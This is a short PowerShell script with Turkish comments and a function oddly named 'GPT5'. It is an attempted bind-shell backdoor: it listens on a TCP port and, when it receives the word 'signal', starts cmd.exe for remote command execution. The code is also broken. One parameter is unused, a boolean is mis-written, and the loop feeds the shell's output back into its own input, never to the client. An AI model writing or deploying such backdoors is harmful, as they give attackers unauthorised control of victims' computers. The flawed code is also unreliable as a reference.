function GPT5
{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, Position=1)]
        [string]$IPAddress,

        [Parameter(Mandatory=$True, Position=2)]
        [int]$Port
    )

    # Listener'ı başlatıyoruz.
    $listener = New-Object System.Net.Sockets.TcpListener([IPAddress]::Any, $Port)
    $listener.Start()

    while ($true)
    {
        # İstemciyi kabul ediyoruz.
        $client = $listener.AcceptTcpClient()

        # Gelen veriyi okuyoruz.
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $data = $reader.ReadToEnd()

        # Sinyal geldiğinde cmd.exe'yi açıyoruz.
        if ($data -eq "signal")
        {
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo.FileName = "cmd.exe"
            $process.StartInfo.RedirectStandardInput = $true
            $process.StartInfo.RedirectStandardOutput = $true
            $process.StartInfo.UseShellExecute = false
            $process.Start()

            $writer = $process.StandardInput
            $reader = $process.StandardOutput

            # İstemci ile iletişime geçiyoruz.
            while ($process.HasExited -eq $false)
            {
                $line = $reader.ReadLine()
                if ($line -ne $null)
                {
                    $writer.WriteLine($line)
                    $writer.Flush()
                }

                Start-Sleep -Milliseconds 100
            }
        }

        $client.Close()
    }
}
